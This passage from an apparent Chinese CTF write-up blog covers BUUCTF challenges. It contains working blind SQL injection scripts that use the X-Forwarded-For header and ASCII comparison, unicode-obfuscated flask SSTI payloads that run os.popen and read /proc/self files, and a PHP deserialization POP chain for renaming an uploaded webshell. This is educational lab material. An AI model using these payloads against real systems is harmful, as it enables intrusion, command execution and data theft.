查询时会用到x-forwarded-for1，这里就是利用点</p><blockquote><p>不看源码，推不出来</p><p>下次如果猜是二次注入，可以多试几次，像这个就是第三次执行</p></blockquote><p>单引号闭合</p><p>第一次输入<code>1&#39; or &#39;1</code></p><p>第二次输入1</p><p>第三次输入1</p><p><img src="/../images/image-20220812122454399-1687489655115.png" alt="image-20220812122454399"></p><p>可以看到第一次的输入执行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.buuoj.cn:26803/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table</span>():</span><br><span class="line">    table = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#控制长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right =<span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> left&lt;right:</span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            payload = <span class="string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;track_uuid=1042e154-3129-4065-939a-e2c5f6d999e5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;X-Forwarded-For&#x27;</span>:payload,</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># data=&#123;</span></span><br><span class="line">            <span class="comment">#     &#x27;id&#x27;:payload,</span></span><br><span class="line">            <span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line">            <span class="comment">#res = requests.get(url=url,params=data)</span></span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line"></span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;track_uuid=1042e154-3129-4065-939a-e2c5f6d999e5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="string">&#x27;payload&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment"># 字符串为成功的标志</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Last Ip: 1&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 防止429</span></span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        table+=<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(table)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_table()</span><br></pre></td></tr></table></figure><h2 id="盲注之ascii偏移"><a href="#盲注之ascii偏移" class="headerlink" title="盲注之ascii偏移"></a>盲注之ascii偏移</h2><p>使用场景</p><ul><li><p>关键字无过滤</p></li><li><p>select * from flag;的返回值只能为1行</p></li></ul><ol><li><p>判断字段数</p><p>假设有如下表，列数为2</p><p><img src="/../images/image-20220711155449466-1687489655114.png" alt="image-20220711155449466"></p><p>使用如下命令会报错</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure></li><li><p>判断字段值</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure></li></ol><p><img src="/../images/image-20220711155653013-1687489655114.png" alt="image-20220711155653013"></p><p>​      <code>select(1,1)</code>的返回值为1,1;  <code>select * from flag</code>的返回值为1，’flag{xxxx}’；</p><p>​      1与1比较相等，1与’flag{xxxx}’比较，1&gt;’f’,所以最后返回的是1。</p><blockquote><p>​     因为mysql中数字与字符串比较与php中相同。</p></blockquote><p>所以我们可以根据此来编写脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://f6dc9323-7652-4182-8dd7-aea9fd09183f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"><span class="comment">#&#123;&#125;的位置是想要读取的字段值所在列</span></span><br><span class="line">payload=<span class="string">&#x27;0^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        </span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line">        params=&#123;<span class="string">&#x27;id&#x27;</span>:payload.<span class="built_in">format</span>(hexchar)&#125;</span><br><span class="line"></span><br><span class="line">        re=requests.post(url=url,data=params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            <span class="comment"># -1是因为当&gt;成立时，差值为1</span></span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>[网鼎杯 2020 白虎组]PicDown</p><p>[pasecactf_2019]flask_ssti</p><p>提示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">line, key, key2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在config中保存了flag加密后的值。</p><p>这题要开代理才能做，不然文件加载不了。。</p><p><img src="/../images/image-20221008124443508-1686983099354.png" alt="image-20221008124443508"></p><p>有过滤，unicode编码绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[][<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>有回显当前环境下的类，那就正常找可利用类的位置</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">80</span>][<span class="string">&quot;\u006c\u006f\u0061\u0064\u005f\u006d\u006f\u0064\u0075\u006c\u0065&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221008124706289-1686983099353.png" alt="image-20221008124706289"></p><p>可以看到是可以执行命令的。然后根据提示，就需要我们读取python文件。</p><h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><blockquote><ol><li><strong>在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></li><li><strong><code>/proc/self</code>在使用时，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取&#x2F;proc&#x2F;self&#x2F;cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如文件包含漏洞，或者SSTI使用file模块读取文件）的方式读取&#x2F;proc&#x2F;self&#x2F;cmdline。</strong></li></ol></blockquote><ul><li><p>读取当前进程</p><ul><li><p>&lt;class ‘_frozen_importlib_external.FileLoader’&gt;这个类，其下有[“get_data”]方法可以读取文件。</p></li><li><p>为什么不能直接用命令cat读取呢？</p><p>因为&#x2F;proc&#x2F;self存储的是当前进程下的信息，如果使用cat命令读取的就是cat进程的信息，而不是当前进程的信息。</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/cmdline&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221008125010896-1686983099354.png" alt="image-20221008125010896"></p><ul><li>读取app.py,这里app.py也被过滤了</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;\u0061\u0070\u0070\u002e\u0070\u0079&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>整理一下得到的源码，发现把最重要的部分放在了注释里。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line">flag = flag[:<span class="number">42</span>]</span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到flag明文是放在&#x2F;app&#x2F;flag中的，并且只进行了open操作，没有close操作。</p><blockquote><p><strong>在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p></blockquote><p>所以我们要去读取&#x2F;proc&#x2F;self&#x2F;fd&#x2F;？,得到&#x2F;app&#x2F;flag文件</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>3是通过burp爆破得到的。</p></blockquote><p>实际上还有另一种解法，因为提示中给了flag是放在config环境变量中的，加密算法用了异或是对称加密，而且这道题没有过滤config，所以我们直接<code>&#123;&#123;config&#125;&#125;</code>拿到加密后的flag，对其进行加密就能得到flag的明文形式了。</p><h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>cookie中存在序列化内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">5</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;ID&quot;</span>;i:<span class="number">3</span>;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">79</span>:<span class="string">&quot;../upload/c47b21fcf8f0bc8b3920541abd8024fd/8052c42ab3b8aa06a3f5f788a4ddccc2.png&quot;</span>&#125;</span><br></pre></td></tr></table></figure><blockquote><p>保存的是我们用户的信息</p></blockquote><p>信息收集得到源代码</p><p>序列化</p><p>Login::login</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#登录后，设置cookie&#123;user:base64_encode(serialize($user_info))&#125;</span></span><br><span class="line">            <span class="variable">$user_info</span>=<span class="title function_ invoke__">db</span>(<span class="string">&quot;user&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;email&quot;</span>,<span class="variable">$email</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user_info</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) === <span class="variable">$user_info</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="variable">$cookie_data</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_info</span>));</span><br><span class="line">                    <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable">$cookie_data</span>,<span class="number">3600</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;Login successful!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../home&#x27;</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Login failed!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>Profile::update_cookie</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#更换头像后，更新cookie</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker-&gt;profile[<span class="string">&#x27;img&#x27;</span>]=<span class="variable language_">$this</span>-&gt;img;</span><br><span class="line">        <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反序列化</p><p>Index::login_check()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$profile</span>=<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$profile</span>))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$profile</span>));</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile_db=<span class="title function_ invoke__">db</span>(<span class="string">&#x27;user&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;ID&quot;</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">array_diff</span>(<span class="variable">$this</span>-&gt;profile_db,<span class="variable">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>该函数用于检验用户是否已登录，在登录后的每个界面都要被调用。</p></blockquote><p>文件上传后的操作</p><p>经典php文件上传操作，引用菜鸟教程的gif</p><p><img src="/../images/upload-form.gif" alt="img"></p><p>最后得到的图片路径就是这样的</p><p>..&#x2F;upload&#x2F;c47b21fcf8f0bc8b3920541abd8024fd&#x2F;8052c42ab3b8aa06a3f5f788a4ddccc2.png</p><blockquote><p>因为后缀名一定是png，所以正常来说是无法利用的，但是这里存在反序列化漏洞，导致我们可以自定义文件名</p></blockquote><p>Profile::upload_img()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">#调用Index::login_check(),检验用户是否存在</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">login_check</span>())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#对上传文件的文件名进行处理</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">            <span class="comment">#设置临时文件名</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="comment">#设置文件名，加上.png后缀</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename=<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="comment">#检验文件后缀名是否为png</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ext_check</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="comment">#获取文件大小判断是否为 图片</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                <span class="comment">#将临时文件复制到创建的文件中</span></span><br><span class="line">                @<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="comment">#设置图片路径</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="comment">#更新头像图片</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">update_img</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Forbidden type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Unknow file type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>关注</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将临时文件复制到创建的文件中</span></span><br><span class="line">@<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line"><span class="comment">#设置图片路径</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>令filename_tmp为我们上传的木马文件路径</p><p>只要我们可以控制filename，我们就可以自定义木马文件的文件名，就可以解析木马文件</p></blockquote><p>看一下Profile类的魔术方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以得到如果触发了call方法，就可以触发get方法。因为Profile类没有name属性，而call方法中访问了这个属性。</p><p>所以我们可以构造except[$name]&#x3D;&#x3D;upload_img，就可以调用upload_img方法。</p></blockquote><p>再找一下谁能触发call方法</p><p>Register::destruct</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;registed)&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><blockquote><p>让checker为Profile类即可</p></blockquote><p>pop链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Register</span>::<span class="variable constant_">destruct</span> → <span class="title class_">Profile</span>::<span class="variable constant_">call</span> → <span class="title class_">Profile</span>::<span class="variable constant_">get</span> → <span class="title class_">Profile</span>::<span class="variable constant_">upload_img</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#要加命名空间，否则php不知道序列化哪一个类。</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$profile</span>-&gt;except = [<span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>-&gt;img = <span class="string">&quot;upload_img&quot;</span>;</span><br><span class="line"><span 